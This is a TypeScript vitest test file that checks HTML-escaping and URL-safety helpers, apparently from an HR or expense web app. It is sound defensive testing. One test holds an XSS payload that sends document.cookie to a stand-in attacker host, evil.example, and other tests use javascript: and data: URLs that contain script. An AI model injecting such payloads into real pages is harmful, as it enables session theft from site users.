import { describe, expect, it } from "vitest";
import { escapeHtml, isSafeHttpUrl } from "./html";

describe("escapeHtml", () => {
  it("escapes all five reserved HTML characters", () => {
    expect(escapeHtml(`<script>alert("x") & 'y'</script>`)).toBe(
      "&lt;script&gt;alert(&quot;x&quot;) &amp; &#39;y&#39;&lt;/script&gt;",
    );
  });

  it("leaves plain text untouched", () => {
    expect(escapeHtml("Ravi Teja Reddy")).toBe("Ravi Teja Reddy");
  });

  it("neutralizes an injected img/onerror payload used as a stand-in for an employee name", () => {
    const malicious = `<img src=x onerror="fetch('https://evil.example/steal?c='+document.cookie)">`;
    const escaped = escapeHtml(malicious);
    expect(escaped).not.toContain("<img");
    expect(escaped).toContain("&lt;img");
  });
});

describe("isSafeHttpUrl", () => {
  it("accepts http URLs", () => {
    expect(isSafeHttpUrl("http://example.com/receipt.png")).toBe(true);
  });

  it("accepts https URLs", () => {
    expect(isSafeHttpUrl("https://example.com/resume.pdf")).toBe(true);
  });

  it("rejects javascript: URLs", () => {
    expect(isSafeHttpUrl("javascript:alert(1)")).toBe(false);
  });

  it("rejects data: URLs", () => {
    expect(isSafeHttpUrl("data:text/html,<script>alert(1)</script>")).toBe(false);
  });

  it("rejects malformed input instead of throwing", () => {
    expect(isSafeHttpUrl("not a url at all")).toBe(false);
  });

  it("rejects an empty string", () => {
    expect(isSafeHttpUrl("")).toBe(false);
  });
});
